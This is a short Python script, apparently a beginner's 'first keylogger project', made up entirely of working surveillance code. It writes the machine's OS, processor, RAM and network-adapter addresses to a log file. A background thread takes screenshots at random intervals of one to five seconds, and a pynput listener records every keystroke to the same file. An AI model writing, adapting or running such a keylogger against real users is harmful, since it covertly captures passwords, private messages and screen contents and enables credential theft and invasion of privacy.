#My First Keylogger Project#

######IMPORTS########

import platform,psutil,json,logging,ifaddr,random,time,pyautogui,threading
from pynput import keyboard as keyb


########OS infos############

def computerInfos(): #Function to get computer information
    try:
        mach = {}
        mach['Operational System']=platform.system()
        mach['O.S. Architecture']=platform.machine()
        mach['O.S. Kernel']=platform.release()
        mach['Distro']=platform.version()
        mach['Processor']=platform.processor()
        mach['RAM Memory']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+"GB"
        return json.dumps(mach)
    except Exception as e:
        logging.exception(e)

adapters = ifaddr.get_adapters() #Variable used to store the net adapters information

with open("./logtext.txt", "a") as arq:
    for espec,info in json.loads(computerInfos()).items():
        arq.write('%s:%s\n' % (espec, info))
    for adapter in adapters:
        arq.write("\nNetwork Adapter " + adapter.nice_name + ": %s/%s" % (adapter.ips[0].ip, adapter.ips[0].network_prefix))

    arq.write("\n\n")
    arq.close()

######################################

def screenCapture():
    while True:
        try:
            time_count = random.randint(1, 5) #Generating the delay timeout
            time.sleep(time_count) #Applying the timeout selected
            scr_captured = pyautogui.screenshot() #Generating the screen capturing

            arq_name = str(time.time())+".png" #Screenshot saved based on the current time
            scr_captured.save(rf"./{arq_name}")
        except KeyboardInterrupt:
            return 0

threading.Thread(target=screenCapture).start()

#######Keylogger CODE#########

def keyLogging(key_stroke):
    with open("./logtext.txt", "a") as logger:
        try:
            logger.write('{0}'.format(key_stroke.char))
        except AttributeError:
            caract = '{0}'.format(key_stroke)
            caract = caract.split(".")
            logger.write("[" + caract[1] + "],")

with keyb.Listener(
        on_press=keyLogging) as listener: 
    listener.join()

######################################
